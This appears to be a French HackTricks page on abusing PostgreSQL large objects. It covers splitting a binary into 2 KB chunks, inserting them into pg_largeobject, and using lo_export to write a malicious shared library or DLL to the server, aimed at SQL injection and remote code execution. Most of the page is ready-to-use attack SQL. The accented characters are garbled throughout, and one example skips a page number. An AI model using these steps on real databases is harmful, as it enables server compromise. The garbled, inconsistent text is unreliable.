```bash
split -b 2048 your_binary
```

Pour **sauvegarder un fichier complet dans cette table**, vous devez d'abord **cr√©er un objet** dans la table mentionn√©e (identifi√© par un **LOID**) puis **ins√©rer des morceaux de 2 Ko** dans cet objet. Il est tr√®s important que tous les **morceaux fassent 2 Ko** (sauf peut-√™tre le dernier) **ou** la fonction d'**exportation** vers le syst√®me de fichiers **ne fonctionnera pas**.

Pour **diviser** votre **binaire** en **morceaux** de **2 Ko**, vous pouvez faire :
```bash
split -b 2048 pg_exec.so #This will create files of size 2KB
```
Afin de coder chacun des fichiers cr√©√©s en Base64 ou Hex, vous pouvez utiliser :
```bash
base64 -w 0 <Chunk_file> #Encoded in 1 line
xxd -ps -c 99999999999 <Chunk_file> #Encoded in 1 line
```
{% hint style="info" %}
Lors de l'exploitation, n'oubliez pas que vous devez envoyer des **morceaux de 2 Ko de bytes en clair** (et non 2 Ko de bytes encod√©s en base64 ou hexad√©cimal). Si vous tentez d'automatiser cela, la taille d'un fichier **encod√© en hexad√©cimal** est le **double** (vous devez donc envoyer 4 Ko de donn√©es encod√©es pour chaque morceau) et la taille d'un fichier encod√© en **base64** est `ceil(n / 3) * 4`
{% endhint %}

De plus, en d√©boguant le processus, vous pouvez voir le contenu des grands objets cr√©√©s avec :
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
# Utilisation de lo\_creat & Base64

Tout d'abord, nous devons cr√©er un LOID o√π les donn√©es binaires vont √™tre sauvegard√©es :
```sql
SELECT lo_creat(-1);       -- returns OID of new, empty large object
SELECT lo_create(173454);   -- attempts to create large object with OID 43213
```
Si vous exploitez une **Blind SQLinjection**, vous serez probablement plus int√©ress√© par l'utilisation de `lo_create` avec un **LOID fixe** afin de **savoir o√π** vous devez **t√©l√©verser** le **contenu**.\
Notez √©galement qu'il n'y a pas d'erreur de syntaxe, les fonctions sont `lo_creat` et `lo_create`.

Le LOID est utilis√© pour identifier l'objet dans la table `pg_largeobject`. L'insertion de blocs de 2 Ko dans la table `pg_largeobject` peut √™tre r√©alis√©e en utilisant :
```sql
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 1, decode('<B64 chunk2>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 3, decode('<B64 chunk2>', 'base64'));
```
```markdown
Enfin, vous pouvez exporter le fichier vers le syst√®me de fichiers en faisant (pendant cet exemple, le LOID utilis√© √©tait `173454`):
```
```sql
SELECT lo_export(173454, '/tmp/pg_exec.so');
```
{% hint style="info" %}
Notez que dans les versions les plus r√©centes de postgres, vous devrez peut-√™tre **t√©l√©charger les extensions sans indiquer de chemin du tout**. [**Lisez ceci pour plus d'informations**.](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

Il se peut que vous souhaitiez supprimer le grand objet cr√©√© apr√®s l'avoir export√© :
```sql
SELECT lo_unlink(173454);  -- deletes large object with OID 173454
```
# Utilisation de lo\_import & Hex

Dans ce sc√©nario, lo\_import va √™tre utilis√© pour cr√©er un grand objet. Heureusement, dans ce cas, vous pouvez (et ne pouvez pas) sp√©cifier le LOID que vous souhaiteriez utiliser :
```sql
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts');
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts', 173454);
```
Apr√®s avoir cr√©√© l'objet, vous pouvez commencer √† ins√©rer les donn√©es sur chaque page (souvenez-vous, vous devez ins√©rer des blocs de 2 Ko) :
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=2;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=3;
```
Le HEX doit √™tre juste le hex (sans `0x` ou `\x`), exemple :
```sql
update pg_largeobject set data=decode('68656c6c6f', 'hex') where loid=173454 and pageno=0;
```
Finalement, exportez les donn√©es dans un fichier et supprimez l'objet volumineux :
```sql
select lo_export(173454, 'C:\\path\to\pg_extension.dll');
select lo_unlink(173454);  -- deletes large object with OID 173454
```
{% hint style="info" %}
Notez que dans les versions les plus r√©centes de postgres, vous pourriez avoir besoin de **t√©l√©charger les extensions sans indiquer de chemin** du tout. [**Lisez ceci pour plus d'informations**.](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

# Limitations

Apr√®s avoir lu la documentation sur les grands objets dans PostgreSQL, nous pouvons d√©couvrir que **les grands objets peuvent avoir une ACL** (Liste de Contr√¥le d'Acc√®s). Il est possible de configurer **de nouveaux grands objets** de sorte que votre utilisateur **n'ait pas suffisamment de privil√®ges** pour les lire, m√™me s'ils ont √©t√© cr√©√©s par votre utilisateur.

Cependant, il peut y avoir **un ancien objet avec une ACL qui permet √† l'utilisateur actuel de le lire**, alors nous pouvons exfiltrer le contenu de cet objet.


<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
